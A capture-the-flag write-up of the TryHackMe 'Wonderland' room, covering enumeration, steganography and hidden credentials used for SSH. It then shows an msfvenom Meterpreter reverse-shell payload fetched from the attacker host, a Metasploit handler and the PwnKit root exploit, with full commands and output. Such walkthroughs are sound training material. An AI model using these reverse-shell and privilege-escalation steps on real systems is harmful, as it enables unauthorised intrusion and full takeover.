https://tryhackme.com/room/wonderland

# nmap

```
joshua@kaligra:~/Documents/thm/wonderland$ cat first_scan.nmap
# Nmap 7.93 scan initiated Sun Nov  6 15:30:40 2022 as: nmap -Pn -T4 -p- -oA first_scan 10.10.214.233
Nmap scan report for 10.10.214.233
Host is up (0.072s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Sun Nov  6 15:31:05 2022 -- 1 IP address (1 host up) scanned in 24.79 seconds
```

```
joshua@kaligra:~/Documents/thm/wonderland$ cat advanced_scan.nmap
# Nmap 7.93 scan initiated Sun Nov  6 15:31:23 2022 as: nmap -Pn -T4 -p80 -sC -sV -oA advanced_scan 10.10.214.233
Nmap scan report for 10.10.214.233
Host is up (0.055s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov  6 15:31:38 2022 -- 1 IP address (1 host up) scanned in 14.64 seconds
```

# website, first look

![](attachment/Pasted%20image%2020221106153727.png)

```
<!DOCTYPE html>
<head>
    <title>Follow the white rabbit.</title>
    <link rel="stylesheet" type="text/css" href="[/main.css](view-source:http://10.10.214.233/main.css)">
</head>
<body>
    <h1>Follow the White Rabbit.</h1>
    <p>"Curiouser and curiouser!" cried Alice (she was so much surprised, that for the moment she quite forgot how to speak good English)</p>
    <img src="[/img/white_rabbit_1.jpg](view-source:http://10.10.214.233/img/white_rabbit_1.jpg)" style="height: 50rem;">
</body>
```

# Gobuster

We run `gobuster` and we found a folder:

```
joshua@kaligra:~/Documents/thm/wonderland$ gobuster dir -u http://10.10.214.233 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,bak -o gobuster.txt
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.214.233
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Extensions:              php,txt,bak
[+] Timeout:                 10s
===============================================================
2022/11/06 15:39:22 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 0] [--> img/]
/r                    (Status: 301) [Size: 0] [--> r/]
..
..
```

![](attachment/Pasted%20image%2020221106154039.png)


```
<!DOCTYPE html>
<head>
    <title>Follow the white rabbit.</title>
    <link rel="stylesheet" type="text/css" href="[/main.css](view-source:http://10.10.214.233/main.css)">
</head>
<body>
    <h1>Keep Going.</h1>
    <p>"Would you tell me, please, which way I ought to go from here?"</p>
</body>
```

Keep going... we found another path:

http://10.10.214.233/poem/

![](attachment/Pasted%20image%2020221106154712.png)

Nothing else with `directory-list-2.3-small.txt`

Le'ts try again with `directory-list-2.3-medium.txt`

Meanwhile we generate a simple wordlist with `cewl` , starting with /poem page:

```
cewl -m 3 -w wordlist.txt http://10.10.214.233/poem
cat wordlist.txt | tr [A-Z] [a-z] > wordlist2.txt
gobuster dir -u http://10.10.214.233 -w wordlist2.txt
```

(no results)

By the way, we can take a look on http://10.10.214.233/img/

![](attachment/Pasted%20image%2020221106163122.png)

```
joshua@kaligra:~/Documents/thm/wonderland/10.10.214.233/img$ file *
alice_door.jpg:     JPEG image data, JFIF standard 1.02, resolution (DPI), density 600x600, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=7, orientation=upper-left, xresolution=98, yresolution=106, resolutionunit=2, software=Adobe Photoshop CS3 Macintosh, datetime=2008:01:20 01:49:10], progressive, precision 8, 1962x1942, components 3
alice_door.png:     PNG image data, 1962 x 1942, 8-bit/color RGBA, non-interlaced
white_rabbit_1.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 594x594, segment length 16, baseline, precision 8, 1102x1565, components 3
```

Metadata:

```
joshua@kaligra:~/Documents/thm/wonderland/10.10.214.233/img$ exiftool alice_door.jpg
ExifTool Version Number         : 12.44
File Name                       : alice_door.jpg
Directory                       : .
File Size                       : 1556 kB
File Modification Date/Time     : 2020:05:25 18:34:52+02:00
File Access Date/Time           : 2022:11:06 16:32:05+01:00
File Inode Change Date/Time     : 2022:11:06 16:31:45+01:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.02
Exif Byte Order                 : Big-endian (Motorola, MM)
Orientation                     : Horizontal (normal)
X Resolution                    : 600
Y Resolution                    : 600
Resolution Unit                 : inches
Software                        : Adobe Photoshop CS3 Macintosh
Modify Date                     : 2008:01:20 01:49:10
Color Space                     : Uncalibrated
Exif Image Width                : 1962
Exif Image Height               : 1942
Compression                     : JPEG (old-style)
Thumbnail Offset                : 332
Thumbnail Length                : 12311
Current IPTC Digest             : 460cf28926b856dab09c01a1b0a79077
Application Record Version      : 2
IPTC Digest                     : 460cf28926b856dab09c01a1b0a79077
Displayed Units X               : inches
Displayed Units Y               : inches
Print Style                     : Centered
Print Position                  : 0 0
Print Scale                     : 1
Global Angle                    : 30
Global Altitude                 : 30
Copyright Flag                  : False
URL List                        :
Slices Group Name               : De_Alice's_Abenteuer_im_Wunderland_Carroll_pic_03
Num Slices                      : 1
Pixel Aspect Ratio              : 1
Photoshop Thumbnail             : (Binary data 12311 bytes, use -b option to extract)
Has Real Merged Data            : Yes
Writer Name                     : Adobe Photoshop
Reader Name                     : Adobe Photoshop CS3
Photoshop Quality               : 12
Photoshop Format                : Progressive
Progressive Scans               : 3 Scans
XMP Toolkit                     : Adobe XMP Core 4.1-c036 46.276720, Mon Feb 19 2007 22:13:43
Create Date                     : 2008:01:20 01:47:53-05:00
Metadata Date                   : 2008:01:20 01:49:10-05:00
Creator Tool                    : Adobe Photoshop CS3 Macintosh
Format                          : image/jpeg
Color Mode                      : RGB
History                         :
Instance ID                     : uuid:436B87178CC8DC11A35E97C268772518
Native Digest                   : 256,257,258,259,262,274,277,284,530,531,282,283,296,301,318,319,529,532,306,270,271,272,305,315,33432;75A2F56A7448AE47A140395308BA4302
DCT Encode Version              : 100
APP14 Flags 0                   : [14]
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 1962
Image Height                    : 1942
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 1962x1942
Megapixels                      : 3.8
Thumbnail Image                 : (Binary data 12311 bytes, use -b option to extract)

```

```
joshua@kaligra:~/Documents/thm/wonderland/10.10.214.233/img$ exiftool alice_door.png
ExifTool Version Number         : 12.44
File Name                       : alice_door.png
Directory                       : .
File Size                       : 1844 kB
File Modification Date/Time     : 2020:06:02 00:23:17+02:00
File Access Date/Time           : 2022:11:06 16:32:16+01:00
File Inode Change Date/Time     : 2022:11:06 16:31:46+01:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1962
Image Height                    : 1942
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
SRGB Rendering                  : Perceptual
Gamma                           : 2.2
Pixels Per Unit X               : 23622
Pixels Per Unit Y               : 23622
Pixel Units                     : meters
Image Size                      : 1962x1942
Megapixels                      : 3.8

```

```
joshua@kaligra:~/Documents/thm/wonderland/10.10.214.233/img$ exiftool white_rabbit_1.jpg
ExifTool Version Number         : 12.44
File Name                       : white_rabbit_1.jpg
Directory                       : .
File Size                       : 1993 kB
File Modification Date/Time     : 2020:05:25 18:25:28+02:00
File Access Date/Time           : 2022:11:06 16:32:34+01:00
File Inode Change Date/Time     : 2022:11:06 16:31:47+01:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 594
Y Resolution                    : 594
Image Width                     : 1102
Image Height                    : 1565
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:2 (2 1)
Image Size                      : 1102x1565
Megapixels                      : 1.7

```

# Steg?

Try to find something:

```
joshua@kaligra:~/Documents/thm/wonderland/10.10.214.233/img$ stegseek --seed alice_door.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 100.00% (4294770000 seeds)
[!] error: Could not find a valid seed.
joshua@kaligra:~/Documents/thm/wonderland/10.10.214.233/img$ stegseek  alice_door.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 99.54% (132.8 MB)
[!] error: Could not find a valid passphrase.
```

Probably we have something on 

`white_rabbit_1.jpg`


```
joshua@kaligra:~/Documents/thm/wonderland/10.10.214.233/img$ stegseek --seed white_rabbit_1.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found (possible) seed: "3b75655e"
        Plain size: 49.0 Byte(s) (compressed)
        Encryption Algorithm: rijndael-128
        Encryption Mode:      cbc

```

In fact:

```
joshua@kaligra:~/Documents/thm/wonderland/10.10.214.233/img$ stegseek white_rabbit_1.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""

[i] Original filename: "hint.txt".
[i] Extracting to "white_rabbit_1.jpg.out".
```

```
$ cat white_rabbit_1.jpg.out
follow the r a b b i t
```

So, back to website:

![](attachment/Pasted%20image%2020221106164710.png)

We arrive here:

http://10.10.214.233/r/a/b/b/i/t/


![](attachment/Pasted%20image%2020221106164745.png)

We look at source code, we probably have some credentials:

```
<!DOCTYPE html>

<head>
    <title>Enter wonderland</title>
    <link rel="stylesheet" type="text/css" href="[/main.css](view-source:http://10.10.214.233/main.css)">
</head>

<body>
    <h1>Open the door and enter wonderland</h1>
    <p>"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."</p>
    <p>Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"
    </p>
    <p>"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving
        the other paw, "lives a March Hare. Visit either you like: they’re both mad."</p>
    <p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
    <img src="[/img/alice_door.png](view-source:http://10.10.214.233/img/alice_door.png)" style="height: 50rem;">
</body>
```


`alice:HowDothTheLittleCrocodileImproveHisShiningTail`

Let's try:

# Foothold



```
joshua@kaligra:~/Documents/thm/wonderland$ ssh alice@10.10.214.233
The authenticity of host '10.10.214.233 (10.10.214.233)' can't be established.
ED25519 key fingerprint is SHA256:Q8PPqQyrfXMAZkq45693yD4CmWAYp5GOINbxYqTRedo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.214.233' (ED25519) to the list of known hosts.
alice@10.10.214.233's password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Nov  6 15:49:10 UTC 2022

  System load:  0.0                Processes:           84
  Usage of /:   18.9% of 19.56GB   Users logged in:     0
  Memory usage: 34%                IP address for eth0: 10.10.214.233
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
alice@wonderland:~$
```

```
alice@wonderland:~$ ls
root.txt  walrus_and_the_carpenter.py
alice@wonderland:~$ cat root.txt
cat: root.txt: Permission denied

```

# Local enumeration

```
alice@wonderland:~$ uname -ar
Linux wonderland 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
alice@wonderland:~$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.4 LTS
Release:        18.04
Codename:       bionic

```

We run `LinPeas` and we found something interesting:

![](attachment/Pasted%20image%2020221106165753.png)


We transfer CVE to target:

```
joshua@kaligra:/opt/tools$ scp CVE-2021-403.tar.gz alice@10.10.214.233:
alice@10.10.214.233's password:
CVE-2021-403.tar.gz            
```

OPS

```
alice@wonderland:~/CVE-2021-4034$ make

Command 'make' not found, but can be installed with:

apt install make
apt install make-guile

Ask your administrator to install one of them.

```

# sudo

```
alice@wonderland:~$ sudo -l
[sudo] password for alice:
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

```

We try with `meterpreter`, so we build a reverse shell payload

```
joshua@kaligra:~/Documents/thm/wonderland$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.9.10.198 LPORT=443 -f elf > shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes

```


```
alice@wonderland:~$ wget http://10.9.10.198:8000/shell.elf
--2022-11-06 16:08:57--  http://10.9.10.198:8000/shell.elf
Connecting to 10.9.10.198:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 250 [application/octet-stream]
Saving to: ‘shell.elf’

shell.elf                                 100%[==================================================================================>]     250  --.-KB/s    in 0s

2022-11-06 16:08:57 (40.5 MB/s) - ‘shell.elf’ saved [250/250]

alice@wonderland:~$ chmod +x shell.elf

```


On our attacker box:

```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set LHOST tun0
LHOST => 10.9.10.198
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.9.10.198:443

```

Run shell on target



```
alice@wonderland:~$ ./shell.elf

```

We receive meterpreter shell:

```
[*] Sending stage (3045348 bytes) to 10.10.214.233
[*] Meterpreter session 1 opened (10.9.10.198:443 -> 10.10.214.233:57546) at 2022-11-06 17:09:55 +0100

meterpreter >
```

```
msf6 exploit(multi/handler) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.214.233 - Collecting local exploits for x64/linux...
[*] 10.10.214.233 - 171 exploit checks are being tried...
[*] Running check method for exploit 11 / 54

```
![](attachment/Pasted%20image%2020221106171615.png)


we choose 
`exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec`

```
msf6 post(multi/recon/local_exploit_suggester) > use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > options

Module options (exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   PKEXEC_PATH                    no        The path to pkexec binary
   SESSION                        yes       The session to run this module on
   WRITABLE_DIR  /tmp             yes       A directory where we can write files


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.8         yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   x86_64


msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set LHOST tun0
LHOST => tun0
msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > sessions -l

Active sessions
===============

  Id  Name  Type                   Information            Connection
  --  ----  ----                   -----------            ----------
  1         meterpreter x64/linux  alice @ 10.10.214.233  10.9.10.198:443 -> 10.10.214.233:57546 (10.10.214.233)

msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set SESSION 1
SESSION => 1
msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > run

[*] Started reverse TCP handler on 10.9.10.198:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[!] Verify cleanup of /tmp/.onblla
[+] The target is vulnerable.
[*] Writing '/tmp/.pjjbcpugh/tjypyk/tjypyk.so' (548 bytes) ...
[!] Verify cleanup of /tmp/.pjjbcpugh
[*] Sending stage (3045348 bytes) to 10.10.214.233
[+] Deleted /tmp/.pjjbcpugh/tjypyk/tjypyk.so
[+] Deleted /tmp/.pjjbcpugh/.nvtlskzz
[+] Deleted /tmp/.pjjbcpugh
[*] Meterpreter session 2 opened (10.9.10.198:4444 -> 10.10.214.233:42998) at 2022-11-06 17:14:59 +0100
meterpreter > shell
Process 17328 created.
Channel 1 created.

id
uid=0(root) gid=0(root) groups=0(root),1001(alice)
```

# privesc

```
cd /root
ls
user.txt
cat user.txt
thm{"Cur[REDACTED]"}
cd /home/alice
ls
CVE-2021-403.tar.gz
CVE-2021-4034
linpeas.sh
root.txt
shell.elf
walrus_and_the_carpenter.py
cat root.txt
thm{[REDACTED}

```

